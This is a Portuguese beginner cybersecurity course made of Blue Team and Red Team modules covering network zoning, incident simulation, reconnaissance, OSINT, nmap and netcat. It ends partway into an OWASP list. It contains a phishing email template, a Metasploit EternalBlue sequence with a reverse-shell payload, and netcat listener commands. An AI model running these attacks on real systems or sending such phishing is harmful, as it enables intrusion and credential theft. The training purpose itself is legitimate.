Segmentação e microsegmentação são pilares da defesa em profundidade. Para o Blue Team N1, aplicar esses princípios fortalece a rede contra ataques avançados, dificulta movimentos laterais e melhora a postura geral de segurança.

---


# 🔵 Blue Team N1: Zonas de Confiança e Controle de Acesso na Rede

Entender as zonas de confiança e implementar controles de acesso eficientes são etapas essenciais para proteger a rede e limitar o impacto de ataques. No Blue Team N1, esses conceitos ajudam a organizar a rede de forma segura e a aplicar políticas que minimizam riscos.

---

## 🧠 O que são zonas de confiança?

- Áreas ou segmentos da rede classificados conforme o nível de segurança e criticidade  
- Cada zona possui um grau diferente de confiança e políticas específicas de acesso  
- Exemplos comuns: zona interna segura, zona DMZ, zona externa (internet)  

---

## 🧱 Tipos comuns de zonas de confiança

```
- **Zona interna (trusted):** Rede corporativa segura com acesso restrito  
- **Zona desmilitarizada (DMZ):** Área pública que hospeda serviços acessíveis externamente, como servidores web  
- **Zona externa (untrusted):** Internet ou redes não confiáveis  
- **Zona de gestão:** Segmento reservado para administração e monitoramento  
```

---

## 🔍 Controle de acesso na rede

- Baseia-se em políticas que determinam quem pode acessar o quê, quando e como  
- Utiliza mecanismos como firewalls, listas de controle de acesso (ACLs), VLANs e NAC (Network Access Control)  
- Implementa princípios como “menor privilégio” e “deny by default”  

---

## ⚙️ Boas práticas para controle de acesso

```
- Segmentar a rede em zonas claras e aplicar regras restritivas entre elas  
- Monitorar e registrar tentativas de acesso para auditoria e análise  
- Usar autenticação forte e métodos de verificação para acesso a zonas sensíveis  
- Atualizar regularmente políticas e regras para se adaptar a novos riscos  
```

---

## ✅ Benefícios para o Blue Team

- Redução da superfície de ataque e limitação de movimentos laterais  
- Melhoria na detecção de atividades suspeitas e anômalas  
- Facilidade na gestão e resposta a incidentes  
- Cumprimento de requisitos de conformidade e auditoria  

---

## ✅ Conclusão

Zonas de confiança e controle de acesso são fundamentos da arquitetura de rede segura. Para o Blue Team N1, implementar esses conceitos é crucial para proteger ativos, controlar riscos e fortalecer a defesa em profundidade.

---

# 🔵 Blue Team N1: Prática – Desenhar uma Arquitetura Simples e Segura para Ambiente Corporativo

Desenhar uma arquitetura de rede segura é um passo fundamental para garantir a proteção dos ativos e a eficiência da defesa. Nesta prática, você vai criar um modelo básico que contempla segmentação, zonas de confiança e controles de acesso essenciais.

---

## 🧠 Objetivos da prática

- Aplicar conceitos de segmentação e zonas de confiança  
- Definir controles básicos de acesso entre segmentos  
- Criar um diagrama simples que represente a arquitetura segura  

---

## 🧱 Elementos principais para incluir no desenho

```
- Zona externa (Internet)  
- Firewall perimetral  
- Zona DMZ para serviços públicos (web, email)  
- Rede interna segmentada (usuários, servidores, gestão)  
- Controle de acesso entre zonas (firewalls, ACLs)  
- Monitoramento e logging  
```

---

## 🔍 Passos para criar sua arquitetura

```
1. Desenhe a internet como fonte externa  
2. Adicione firewall perimetral controlando o tráfego de entrada/saída  
3. Crie uma DMZ isolada para servidores acessíveis externamente  
4. Separe a rede interna em sub-redes: usuários, servidores, gestão  
5. Defina regras de firewall e ACLs entre essas zonas, seguindo princípio de menor privilégio  
6. Inclua sistemas de monitoramento para registrar e analisar tráfego  
```

---

## ⚙️ Exemplo simples (descrição textual)

- Internet → Firewall Perimetral → DMZ (servidores web, email)  
- Firewall → Rede Interna  
  - Sub-rede Usuários (acesso restrito)  
  - Sub-rede Servidores (restrito a usuários e gestão)  
  - Sub-rede Gestão (acesso exclusivo para admins)  

---

## ✅ Dicas para aprimorar

- Use ferramentas de diagramação como draw.io, Lucidchart ou Microsoft Visio  
- Considere adicionar IDS/IPS para monitoramento adicional  
- Pense em políticas de acesso baseadas em identidade e não só IP  
- Documente as regras e revise regularmente  

---

## ✅ Conclusão

Praticar o desenho de arquiteturas simples e seguras ajuda o Blue Team N1 a consolidar fundamentos e preparar defesas eficazes. A clareza e organização na rede são pilares para uma boa postura de segurança.

---

# 🔴 Red Team N1: Técnicas Ofensivas Básicas – Phishing, Engenharia Social, Scanning e Exploits Simples

No início da jornada no Red Team, é fundamental entender e praticar as técnicas ofensivas básicas. Essas habilidades são a base para ataques mais sofisticados e ajudam a compreender as fragilidades que podem ser exploradas em qualquer ambiente.

---

## 🧠 Visão geral das técnicas

- **Phishing:** Enganar usuários para obter credenciais ou informações sensíveis  
- **Engenharia Social:** Manipular pessoas para obter acesso ou informações  
- **Scanning:** Mapear redes, hosts e serviços para identificar pontos fracos  
- **Exploits simples:** Utilizar vulnerabilidades conhecidas para obter acesso ou executar código  

---

## 🧱 Técnicas detalhadas

### 1. Phishing

- Envio de e-mails ou mensagens fraudulentas com links ou anexos maliciosos  
- Uso de páginas falsas (fake login) para capturar dados  
- Testar awareness dos usuários com campanhas simuladas  

```

Exemplo básico de e-mail phishing:

Assunto: Atualização urgente da senha  
Corpo: "Olá, seu acesso foi bloqueado. Clique no link para redefinir: http://fakesite.com"

```

---

### 2. Engenharia Social

- Ligação ou conversa para obter informações confidenciais  
- Fingir ser um técnico, suporte ou colega para ganhar confiança  
- Explorar fraquezas humanas, como curiosidade ou medo  

---

### 3. Scanning

- Utilizar ferramentas como `nmap` para descobrir hosts e portas abertas  
- Identificar sistemas operacionais e serviços em execução  
- Detectar vulnerabilidades iniciais para exploração  

```

Comando básico:

```
nmap -sS -p 1-1000 192.168.1.0/24
```

---

### 4. Exploits Simples

- Utilizar vulnerabilidades conhecidas com ferramentas ou scripts prontos  
- Explorar falhas de software desatualizado ou configurações incorretas  
- Exemplo: uso do Metasploit para explorar vulnerabilidade SMB  

---

## ⚙️ Dicas para o Red Team N1

- Pratique sempre em ambientes controlados e autorizados  
- Entenda o impacto e as consequências de cada técnica  
- Documente seus passos para análise posterior e melhoria  
- Combine técnicas para aumentar a eficácia dos ataques  

---

## ✅ Conclusão

Dominar técnicas ofensivas básicas é essencial para o Red Team N1 criar uma base sólida e se preparar para desafios mais complexos. Com prática e estudo, é possível evoluir e contribuir efetivamente para o ciclo de segurança.

---

# 🔴 Red Team N1: Ferramentas Básicas – nmap e Metasploit

Para começar no Red Team, dominar ferramentas essenciais como **nmap** e **Metasploit** é fundamental. Elas permitem realizar reconhecimento, exploração e post-exploração em ambientes controlados, preparando você para ataques mais complexos.

---

## 🧠 Por que usar essas ferramentas?

- **nmap:** Scanner de redes para mapear hosts, portas abertas e serviços  
- **Metasploit:** Framework para exploração de vulnerabilidades e criação de payloads  
- Ambas são amplamente usadas por profissionais e facilitam a automação de ataques  

---

## 🧱 Ferramenta 1: nmap

- Permite descobrir dispositivos e serviços ativos na rede  
- Detecta sistemas operacionais e versões de software  
- Suporta varreduras rápidas e detalhadas  

```

Exemplo básico:

```
nmap -sS -p 1-1000 192.168.1.0/24
```

---

## 🧱 Ferramenta 2: Metasploit Framework

- Plataforma para desenvolvimento e execução de exploits  
- Contém módulos para scanners, payloads, pós-exploração e mais  
- Pode ser usada via interface gráfica (`msfconsole`) ou scripts  

```

Comandos iniciais:

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

---

## ⚙️ Dicas para iniciantes

- Sempre use em ambientes autorizados e de teste  
- Combine nmap para reconhecimento e Metasploit para exploração  
- Estude cada módulo do Metasploit para entender seu funcionamento  
- Documente suas atividades para aprendizado e segurança  

---

## ✅ Conclusão

nmap e Metasploit são ferramentas pilares para o Red Team N1. Dominar seu uso básico abre portas para técnicas ofensivas mais avançadas e consolida a base para seu crescimento na área.

---

# 🔴 Red Team N1: Prática – Executar Scan Básico e Entender o Impacto na Defesa

Realizar scans de rede é um dos primeiros passos para reconhecimento em testes ofensivos. Porém, é importante compreender como essa atividade pode ser percebida e respondida pelo Blue Team, para ajustar táticas e evitar detecção precoce.

---

## 🧠 Objetivo da prática

- Executar um scan básico usando nmap  
- Observar os logs e alertas gerados nos sistemas de defesa  
- Entender como o Blue Team pode detectar e reagir a esses scans  

---

## 🧱 Ferramentas necessárias

- Máquina com nmap instalado (ex: Kali Linux)  
- Ambiente de laboratório com firewall, IDS/IPS e SIEM (ex: Security Onion)  
- Acesso aos logs de segurança para análise  

---

## 🔍 Passo a passo do scan básico

```

# Executar scan SYN nas portas mais comuns na rede alvo
nmap -sS -p 1-1000 192.168.1.100

```

- Use o parâmetro `-sS` para scan furtivo (SYN scan)  
- Alvo: IP do host que será analisado  
- Observe os resultados: portas abertas, serviços e versões  

---

## 🔍 Observando o impacto na defesa

```

# No ambiente Blue Team, verifique:
- Logs de firewall para tentativas de conexão  
- Alertas no IDS/IPS indicando comportamento suspeito  
- Notificações e correlações no SIEM  
- Acionamento de playbooks de resposta automatizada (se houver)  
```

---

## ⚙️ Discussão

- Scans podem ser detectados como atividades suspeitas ou ataques pré-ativos  
- Blue Team pode bloquear IPs, gerar alertas e iniciar investigações  
- Técnicas de evasão podem ser usadas para reduzir a detecção (ex: timing, fragmentação)  

---

## ✅ Conclusão

Executar scans é essencial para o Red Team, mas entender como a defesa reage é igualmente importante para ajustar estratégias e evitar bloqueios precoces. Essa prática ajuda a equilibrar agressividade e furtividade nos testes.

---

# 🔵 Blue Team N1: Participar ou Criar Exercícios de Simulação de Incidentes (Phishing, Ransomware)

Exercícios de simulação são ferramentas poderosas para preparar equipes para incidentes reais. Eles ajudam a validar processos, identificar gaps e melhorar a colaboração entre times. No Blue Team N1, participar e criar esses exercícios é fundamental para aprimorar a resposta a ameaças.

---

## 🧠 Por que simular incidentes?

- Treinar a equipe em um ambiente controlado  
- Avaliar a eficácia das políticas e ferramentas  
- Melhorar a comunicação e coordenação entre áreas  
- Detectar falhas e pontos de melhoria  

---

## 🧱 Tipos comuns de simulações

### 1. Phishing

- Envio de e-mails simulados para testar a conscientização dos usuários  
- Monitoramento das interações e respostas  
- Treinamento com feedback e reforço positivo  

---

### 2. Ransomware

- Simulação de ataque para testar resposta e recuperação  
- Avaliação de backup, isolamento e comunicação  
- Teste da eficácia do playbook de resposta a incidentes  

---

## 🔍 Como criar um exercício simples

```

1. Defina o objetivo do exercício (ex: testar resposta a phishing)  
2. Planeje o cenário e a duração  
3. Prepare os recursos (e-mails simulados, artefatos, alertas falsos)  
4. Envolva todas as partes interessadas (TI, comunicação, gestão)  
5. Execute a simulação com monitoramento e suporte  
6. Realize um debrief para analisar resultados e lições aprendidas  

```

---

## ⚙️ Boas práticas

```

- Garanta que o exercício não cause impactos reais nos sistemas  
- Comunique a liderança sobre a simulação para apoio  
- Use ferramentas especializadas para envio e monitoramento  
- Documente o processo e os resultados para melhoria contínua  

```

---

## ✅ Benefícios para o Blue Team

- Melhora a prontidão e capacidade de resposta  
- Fortalece a cultura de segurança na organização  
- Reduz o tempo de detecção e mitigação de incidentes  
- Facilita a identificação de falhas em processos e tecnologias  

---

## ✅ Conclusão

Exercícios de simulação são essenciais para o desenvolvimento do Blue Team N1. Eles transformam teoria em prática, preparando a equipe para enfrentar ameaças reais com confiança e eficiência.

---

# 🔵 Blue Team N1: Analisar Respostas e Identificar Pontos de Melhoria

Analisar as respostas a incidentes é fundamental para aprimorar a segurança e aumentar a eficácia da equipe. Para o Blue Team N1, esse processo permite entender onde houve falhas, otimizar procedimentos e fortalecer a defesa.

---

## 🧠 Por que analisar respostas?

- Avaliar a eficiência das ações tomadas  
- Detectar gargalos e atrasos no processo  
- Identificar falhas técnicas e humanas  
- Gerar aprendizado contínuo para prevenção  

---

## 🧱 Passos para análise eficaz

```

1. Coletar evidências e registros do incidente  
2. Revisar o timeline das ações realizadas  
3. Avaliar o cumprimento dos playbooks e procedimentos  
4. Entrevistar envolvidos para entender dificuldades  
5. Mapear causas raízes dos problemas detectados  
6. Priorizar pontos de melhoria com base no impacto  

```

---

## 🔍 Exemplos comuns de pontos de melhoria

- Tempo excessivo para detecção ou contenção  
- Falta de automação em tarefas repetitivas  
- Comunicação ineficiente entre equipes  
- Gaps no treinamento e conscientização  
- Deficiências em ferramentas ou infraestrutura  

---

## ⚙️ Como implementar melhorias

```

- Atualizar e testar playbooks e runbooks regularmente  
- Investir em treinamentos e simulações frequentes  
- Automatizar processos sempre que possível  
- Melhorar canais e processos de comunicação  
- Revisar e otimizar arquitetura e ferramentas de segurança  

```

---

## ✅ Benefícios para o Blue Team

- Respostas mais rápidas e eficazes a incidentes  
- Redução do impacto e tempo de inatividade  
- Maior confiança e preparo da equipe  
- Evolução constante da postura de segurança  

---

## ✅ Conclusão

Analisar respostas e identificar pontos de melhoria são práticas essenciais para o crescimento do Blue Team N1. Essa cultura de aprendizado contínuo fortalece a segurança da organização e prepara o time para novos desafios.

---

# 🔵 Blue Team N1: Prática – Montar Relatório e Lições Aprendidas Após o Simulado

A elaboração de relatórios detalhados e a documentação das lições aprendidas são etapas fundamentais para garantir o aprimoramento contínuo da equipe e da segurança da organização. Após um exercício simulado, esse processo ajuda a consolidar conhecimentos e ajustar estratégias.

---

## 🧠 Objetivos da prática

- Documentar todo o fluxo do simulado  
- Identificar sucessos e falhas durante o exercício  
- Registrar recomendações e ações para melhoria  

---

## 🧱 Estrutura básica do relatório

```

1. **Introdução**  
   - Objetivo do simulado  
   - Data e participantes  

2. **Descrição do cenário**  
   - Tipo de ataque simulado (phishing, ransomware, etc.)  
   - Ferramentas e técnicas usadas  

3. **Cronograma e execução**  
   - Sequência das ações e respostas  
   - Tempo gasto em cada etapa  

4. **Análise dos resultados**  
   - Pontos fortes identificados  
   - Falhas e dificuldades encontradas  

5. **Lições aprendidas**  
   - Recomendações para melhorias técnicas e de processos  
   - Sugestões para treinamentos futuros  

6. **Conclusão**  
   - Resumo do impacto do simulado  
   - Próximos passos  

```

---

## 🔍 Dicas para elaboração

```

- Seja claro e objetivo na escrita  
- Use gráficos e tabelas para facilitar a visualização  
- Inclua evidências relevantes (logs, capturas de tela)  
- Envolva todos os participantes na revisão do relatório  

```

---

## ⚙️ Benefícios do relatório

- Facilita a comunicação com a gestão e outras áreas  
- Serve como base para aprimorar a postura de segurança  
- Permite comparar resultados em simulados futuros  
- Fortalece a cultura de aprendizado e melhoria contínua  

---

## ✅ Conclusão

Montar um relatório detalhado com lições aprendidas é uma prática essencial para o Blue Team N1. Esse documento orienta a evolução da equipe e da organização, transformando experiências em conhecimento valioso.

---

# 🔵 Blue Team N1: Revisar Conceitos Essenciais de Segurança da Informação

Revisar os conceitos fundamentais de segurança da informação é crucial para garantir uma base sólida no desenvolvimento das habilidades do Blue Team. Esses conceitos orientam práticas e decisões diárias para proteger ativos e dados.

---

## 🧠 Conceitos básicos

```

- **Confidencialidade:** Garantir que informações sejam acessadas somente por pessoas autorizadas  
- **Integridade:** Assegurar que dados e sistemas não sejam alterados indevidamente  
- **Disponibilidade:** Garantir que sistemas e dados estejam acessíveis quando necessários  
```

---

## 🧱 Outros conceitos importantes

```

- **Autenticidade:** Confirmar a identidade de usuários e sistemas  
- **Não-repúdio:** Garantir que ações ou transações não possam ser negadas posteriormente  
- **Accountability:** Responsabilização e registro de ações realizadas no sistema  
---

## 🔍 Princípios fundamentais

- **Defesa em profundidade:** Múltiplas camadas de segurança para aumentar proteção  
- **Menor privilégio:** Conceder apenas os acessos estritamente necessários  
- **Segurança por design:** Incorporar segurança desde o planejamento e desenvolvimento  
```

---

## ⚙️ Aplicação prática

```

- Implementar controles de acesso e autenticação fortes  
- Monitorar e auditar atividades para detectar anomalias  
- Planejar backups e redundância para garantir disponibilidade  
- Treinar usuários para evitar falhas humanas  

```

---

## ✅ Conclusão

Revisar e reforçar os conceitos essenciais de segurança da informação ajuda o Blue Team N1 a manter uma postura sólida e alinhada com as melhores práticas, tornando a defesa mais eficiente e confiável.

---

# 🔴 Red Team N1: Introdução ao Red Team – Objetivos, Metodologia e Ciclo de Ataque

O Red Team é fundamental para testar a segurança de uma organização, simulando ataques reais para identificar vulnerabilidades e fortalecer as defesas. No nível N1, entender seus objetivos, metodologia e o ciclo de ataque é essencial para começar a atuar com eficácia.

---

## 🧠 Objetivos do Red Team

```

- Avaliar a postura de segurança de forma realista  
- Identificar vulnerabilidades técnicas, físicas e humanas  
- Testar a capacidade de detecção e resposta do Blue Team  
- Gerar recomendações para melhorar a segurança geral  
```

---

## 🧱 Metodologia básica

```

1. **Reconhecimento:** Coleta de informações sobre o alvo (aberta e passiva)  
2. **Enumeração:** Mapeamento detalhado de sistemas, serviços e usuários  
3. **Exploração:** Uso de vulnerabilidades para ganhar acesso  
4. **Escalada de privilégios:** Obter níveis mais altos de controle  
5. **Movimentação lateral:** Explorar rede para atingir objetivos  
6. **Persistência:** Manter acesso no ambiente comprometido  
7. **Exfiltração:** Coleta e extração de dados sensíveis (quando aplicável)  
```

---

## 🔍 Ciclo de ataque simplificado

```

# Reconhecimento → Enumeração → Exploração → Pós-exploração → Relatório  
```

---

## ⚙️ Dicas para iniciantes

```

- Sempre tenha autorização e execute testes em ambientes controlados  
- Documente todas as etapas para aprendizado e melhorias  
- Combine técnicas manuais e automatizadas  
- Estude ferramentas essenciais para cada fase do ciclo  

```

---

## ✅ Conclusão

Conhecer os objetivos, metodologia e ciclo de ataque do Red Team é o primeiro passo para construir uma carreira sólida em segurança ofensiva. Essa base prepara o profissional para enfrentar desafios reais com ética e competência.

---

# 🔴 Red Team N1: Ambiente de Laboratório com Kali Linux e Máquinas Alvo (Windows, Linux)

Montar um laboratório prático é essencial para desenvolver habilidades no Red Team. Usar Kali Linux como plataforma ofensiva e máquinas alvo com Windows e Linux permite simular ataques reais em ambiente seguro e controlado.

---

## 🧠 Por que montar um laboratório?

```

- Praticar técnicas sem riscos legais  
- Testar ferramentas e exploits em ambientes reais  
- Entender o comportamento dos sistemas alvo  
- Desenvolver e validar procedimentos de ataque e defesa  
```

---

## 🧱 Componentes do laboratório

```

- **Kali Linux:** Distribuição focada em segurança ofensiva com centenas de ferramentas pré-instaladas  
- **Máquinas alvo:** Sistemas Windows e Linux configurados para simular vulnerabilidades e cenários reais  
- **Rede isolada:** Ambiente separado da rede produtiva para segurança e controle  
- **Ferramentas de virtualização:** VMware, VirtualBox, Proxmox ou similares para criar e gerenciar VMs  
```

---

## 🔍 Passos para montar o laboratório

```

1. Instale a ferramenta de virtualização no seu computador  
2. Baixe e configure a VM do Kali Linux  
3. Configure VMs alvo com Windows (ex: Windows 10/Server) e Linux (ex: Ubuntu, CentOS)  
4. Conecte as máquinas em uma rede interna ou host-only para isolamento  
5. Configure snapshots para restaurar rapidamente o ambiente  
6. Teste a comunicação entre as máquinas (ping, SSH, RDP)  
```

---

## ⚙️ Dicas para o Red Team N1

```

- Use versões desatualizadas ou configuradas com vulnerabilidades para prática  
- Documente configurações e topologia da rede  
- Atualize ferramentas e mantenha o ambiente organizado  
- Explore ferramentas de captura de tráfego (Wireshark) e monitoramento  
```

---

## ✅ Benefícios do laboratório

- Ambiente seguro para experimentar sem riscos  
- Aprendizado prático e aprofundado  
- Preparação para testes em ambientes reais  
- Desenvolvimento da confiança e habilidades técnicas  

---

## ✅ Conclusão

Ter um laboratório com Kali Linux e máquinas alvo Windows/Linux é fundamental para o crescimento do Red Team N1. Esse ambiente facilita a prática, o estudo e o aprimoramento das técnicas ofensivas com segurança.

---

# 🔴 Red Team N1: Ferramentas Básicas – nmap, netcat e Enumeração de Serviços

Para iniciar no Red Team, conhecer e dominar ferramentas básicas como **nmap**, **netcat** e técnicas de enumeração de serviços é essencial. Essas ferramentas permitem coletar informações valiosas e preparar o terreno para ataques mais complexos.

---

## 🧠 Por que usar essas ferramentas?

- **nmap:** Scanner de rede para descobrir hosts, portas e serviços  
- **netcat:** Utilitário versátil para comunicação TCP/UDP e testes de portas  
- **Enumeração de serviços:** Processo de identificar versões e configurações para encontrar vulnerabilidades  

---

## 🧱 Ferramenta 1: nmap

```

- Realiza scans rápidos e detalhados  
- Detecta sistemas operacionais e versões de serviços  
- Suporta scripts para automação e exploração  

```

Exemplo básico:

```

nmap -sS -p 1-1000 192.168.1.100

```

---

## 🧱 Ferramenta 2: netcat (nc)

```

- Conecta a portas TCP/UDP para teste e comunicação  
- Pode atuar como listener ou cliente  
- Útil para transferência de arquivos e criação de backdoors simples  

```

Exemplos:

```

# Escutar na porta 4444  
nc -lvp 4444

# Conectar a um host na porta 80  
nc 192.168.1.100 80

```

---

## 🔍 Enumeração de serviços

```

- Após descobrir portas abertas com nmap, use ferramentas específicas para identificar serviços  
- Exemplos:  
  - `ftp` para testar servidores FTP  
  - `smtp` para servidores de e-mail  
  - `rpcinfo` para serviços RPC  
- Essa etapa ajuda a encontrar versões vulneráveis ou mal configuradas  

```

---

## ⚙️ Dicas para iniciantes

```

- Combine nmap e netcat para reconhecimento ativo e passivo  
- Use scripts do nmap (`-sC`) para automatizar enumeração  
- Documente as descobertas para análises futuras  
- Pratique sempre em ambientes autorizados e controlados  

```

---

## ✅ Conclusão

Dominar nmap, netcat e técnicas de enumeração é fundamental para qualquer Red Team N1. Essas ferramentas são a base para coletar informações e planejar ataques eficazes com maior segurança e precisão.

---

# 🔴 Red Team N1: Prática – Escanear Rede e Mapear Ativos

Realizar o mapeamento da rede e identificação dos ativos é um passo fundamental para o Red Team. Essa prática ajuda a entender o ambiente, identificar possíveis alvos e planejar ataques de forma mais precisa.

---

## 🧠 Objetivos da prática

- Descobrir hosts ativos na rede  
- Identificar portas abertas e serviços em execução  
- Mapear sistemas operacionais e versões  
- Criar um inventário inicial para análise posterior  

---

## 🧱 Ferramentas necessárias

```

- **nmap** instalado em uma máquina Linux ou Windows  
- Rede ou ambiente de laboratório configurado para testes  
```

---

## 🔍 Passo a passo para escanear e mapear ativos

```

1. **Descobrir hosts ativos (ping sweep):**  
   nmap -sn 192.168.1.0/24

2. **Escanear portas comuns nos hosts ativos:**  
   nmap -sS -p 1-1000 192.168.1.0/24

3. **Detectar serviços e versões:**  
   nmap -sV 192.168.1.100

4. **Identificar sistema operacional:**  
   nmap -O 192.168.1.100

```

---

## ⚙️ Observações importantes

```

- Execute scans com permissão e em ambientes controlados  
- Use opções de timing para ajustar velocidade e evitar detecção  
- Documente os resultados para referência futura  
- Combine com outras ferramentas para aprofundar a enumeração  

```

---

## ✅ Conclusão

Escanear a rede e mapear ativos é uma prática básica e crucial para o Red Team N1. Essa atividade fornece informações essenciais para planejar ataques e testar defesas com maior eficiência.

---

# 🔴 Red Team N1: Técnicas de Reconhecimento Passivo e Ativo

O reconhecimento é a fase inicial de qualquer operação de Red Team, onde coletamos informações para planejar ataques. Entender as diferenças entre técnicas passivas e ativas é fundamental para agir com eficiência e segurança.

---

## 🧠 Reconhecimento Passivo

```

- Coleta de informações sem interação direta com o alvo  
- Não gera alertas ou logs no ambiente alvo  
- Exemplos:  
  - Pesquisa em fontes públicas (OSINT)  
  - Consulta a bancos de dados WHOIS e DNS  
  - Análise de redes sociais e sites corporativos  
  - Uso de ferramentas como Shodan, Google Dorks  

---

## 🧱 Benefícios do reconhecimento passivo

```

- Mantém o anonimato e reduz chances de detecção  
- Permite levantamento amplo de informações iniciais  
- Fundamenta o planejamento das etapas seguintes  

---

## 🧠 Reconhecimento Ativo

```

- Envolve interação direta com o alvo  
- Pode gerar logs e alertas em sistemas de defesa  
- Exemplos:  
  - Scans de portas com nmap  
  - Testes de vulnerabilidades e sondagens  
  - Captura de banners e identificação de serviços  

---

## 🧱 Cuidados no reconhecimento ativo

```

- Realizar com autorização para evitar problemas legais  
- Usar técnicas furtivas para minimizar detecção  
- Analisar o impacto no ambiente alvo  
- Registrar todas as ações para documentação  

---

## ⚙️ Dicas para Red Team N1

```

- Comece pelo reconhecimento passivo para coletar dados sem risco  
- Use reconhecimento ativo para validar e aprofundar informações  
- Combine ambas as técnicas para um panorama completo  
- Documente tudo para planejar as próximas fases do ataque  

---

## ✅ Conclusão

Dominar técnicas de reconhecimento passivo e ativo é essencial para qualquer profissional de Red Team N1. Essa etapa prepara o terreno para um ataque bem-sucedido, ético e eficiente.

---

# 🔴 Red Team N1: Ferramentas OSINT – Maltego, Recon-ng e Shodan

O OSINT (Open Source Intelligence) é uma etapa crucial para o Red Team, permitindo coletar informações públicas que ajudam a mapear alvos e identificar potenciais pontos de ataque. Dominar ferramentas como Maltego, Recon-ng e Shodan é fundamental para realizar uma coleta eficaz e organizada.

---

## 🧠 Por que usar ferramentas OSINT?

```

- Automatizam a coleta de dados públicos  
- Facilitam a correlação de informações  
- Aceleram o reconhecimento e planejamento  
- Reduzem o risco de detecção, pois usam fontes abertas  

---

## 🧱 Ferramenta 1: Maltego

```

- Plataforma visual para coleta e análise de dados  
- Permite criar grafos relacionando pessoas, domínios, IPs, redes sociais, e mais  
- Suporta integração com diversas fontes OSINT  
- Útil para identificar conexões e padrões complexos  

---

## 🧱 Ferramenta 2: Recon-ng

```

- Framework em Python para automação de coleta OSINT  
- Modular, com dezenas de módulos para diferentes tipos de dados  
- Interface via linha de comando com banco de dados integrado  
- Permite criação de workflows personalizados  

---

## 🧱 Ferramenta 3: Shodan

```

- Motor de busca para dispositivos conectados à internet  
- Permite encontrar servidores, webcams, dispositivos IoT, entre outros  
- Fornece informações sobre serviços, banners e vulnerabilidades conhecidas  
- Ideal para identificar superfícies de ataque expostas  

---

## ⚙️ Dicas para Red Team N1

```

- Combine as ferramentas para obter um panorama completo  
- Use credenciais ou APIs para ampliar a coleta quando possível  
- Documente todas as descobertas para análise posterior  
- Respeite limites éticos e legais durante a coleta  

---

## ✅ Conclusão

Dominar Maltego, Recon-ng e Shodan permite ao Red Team N1 realizar uma coleta OSINT eficaz, abrindo caminho para ataques planejados e fundamentados em dados reais.

---

# 🔴 Red Team N1: Coleta de Dados Sobre Alvos – Domínios, IPs e Funcionários

A coleta de dados é a base para qualquer operação do Red Team. Obter informações precisas sobre domínios, endereços IP e funcionários do alvo permite planejar ataques mais direcionados e eficazes.

---

## 🧠 Por que coletar esses dados?

```

- Mapear a infraestrutura digital da organização  
- Identificar possíveis vetores de ataque  
- Obter dados para engenharia social e phishing  
- Construir perfis para ataques personalizados  

---

## 🧱 Coleta de domínios

```

- Consultar registros DNS para identificar subdomínios e servidores  
- Usar ferramentas como `dig`, `nslookup`, ou serviços online  
- Descobrir domínios relacionados e históricos  
- Explorar certificados SSL para encontrar domínios adicionais  

---

## 🧱 Coleta de IPs

```

- Mapear blocos de IPs associados à organização  
- Identificar servidores públicos e serviços expostos  
- Utilizar Shodan para encontrar dispositivos conectados  
- Monitorar alterações e movimentações na rede pública  

---

## 🧱 Coleta de informações sobre funcionários

```

- Pesquisa em redes sociais (LinkedIn, Twitter, Facebook)  
- Identificar cargos, departamentos e relações internas  
- Obter e-mails corporativos e possíveis senhas vazadas  
- Utilizar ferramentas OSINT para automatizar buscas  

---

## ⚙️ Dicas para Red Team N1

```

- Utilize múltiplas fontes para validar dados  
- Documente informações em banco ou planilha organizada  
- Respeite limites éticos e legais durante a coleta  
- Atualize constantemente os dados para refletir mudanças  

---

## ✅ Conclusão

Coletar dados sobre domínios, IPs e funcionários é um passo crucial no reconhecimento do Red Team N1. Essa etapa fundamenta ataques mais precisos e aumenta a chance de sucesso nas simulações.

---

# 🔴 Red Team N1: Prática – Realizar Reconhecimento Completo de um Alvo Simulado

O reconhecimento completo é a base para um ataque bem-sucedido. Essa prática ajuda a consolidar técnicas passivas e ativas para coletar o máximo de informações sobre um alvo simulado, preparando o terreno para as fases seguintes.

---

## 🧠 Objetivos da prática

- Executar reconhecimento passivo e ativo de forma integrada  
- Mapear infraestrutura, serviços, pessoas e potenciais vulnerabilidades  
- Documentar e organizar os dados coletados para análise  

---

## 🧱 Ferramentas e recursos recomendados

```

- **Ferramentas OSINT:** Maltego, Recon-ng, Shodan  
- **Scanners de rede:** nmap, netcat  
- **Consultas DNS:** dig, nslookup  
- Ambiente de laboratório ou alvo simulado autorizado  

---

## 🔍 Passo a passo sugerido

```

1. **Reconhecimento passivo:**  
   - Pesquisa OSINT para domínios, subdomínios, funcionários e redes sociais  
   - Coleta de dados em bancos públicos e fontes abertas  

2. **Reconhecimento ativo:**  
   - Scans de rede com nmap para identificar hosts e portas abertas  
   - Enumeração de serviços e versões  
   - Testes básicos de vulnerabilidades, sem causar danos  

3. **Análise e documentação:**  
   - Organizar as informações em relatório ou planilha  
   - Destacar potenciais pontos de ataque e estratégias  

```

---

## ⚙️ Cuidados importantes

```

- Realizar todas as ações com autorização e em ambientes controlados  
- Evitar impactos no ambiente alvo  
- Documentar todas as etapas para aprendizado e auditoria  

---

## ✅ Benefícios da prática

- Desenvolvimento de habilidades técnicas em múltiplas ferramentas  
- Compreensão do processo completo de reconhecimento  
- Preparação para fases avançadas de ataques simulados  
- Melhoria na organização e documentação dos dados coletados  

---

## ✅ Conclusão

Realizar um reconhecimento completo em um alvo simulado é fundamental para o Red Team N1 consolidar conhecimentos e praticar de forma segura e estruturada. Essa prática prepara o profissional para desafios reais com mais confiança e precisão.

---

# 🔴 Red Team N1: Conhecer as Principais Vulnerabilidades Comuns (CVE, OWASP)

Entender as vulnerabilidades mais comuns é essencial para o Red Team. Isso ajuda a identificar rapidamente falhas em sistemas e aplicações, aumentando a eficiência dos testes de invasão e da exploração.

---

## 🧠 Principais fontes de vulnerabilidades

```

- **CVE (Common Vulnerabilities and Exposures):** Banco público que lista vulnerabilidades específicas em softwares, sistemas e equipamentos  
- **OWASP (Open Web Application Security Project):** Focado em vulnerabilidades de aplicações web, publica listas como OWASP Top 10  

---

## 🧱 CVE – O que é importante saber

```

- Cada vulnerabilidade tem um identificador único (ex: CVE-2023-12345)  
- Contém descrição, impacto, soluções e referências  
- Usado para identificar falhas em sistemas operacionais, softwares e dispositivos  
- Consultar CVEs ajuda a mapear possíveis alvos de exploração  

---

## 🧱 OWASP Top 10 – Principais vulnerabilidades web

```

1. **Injection** (SQL, OS, LDAP)  
2. **Broken Authentication**  
3. **Sensitive Data Exposure**  
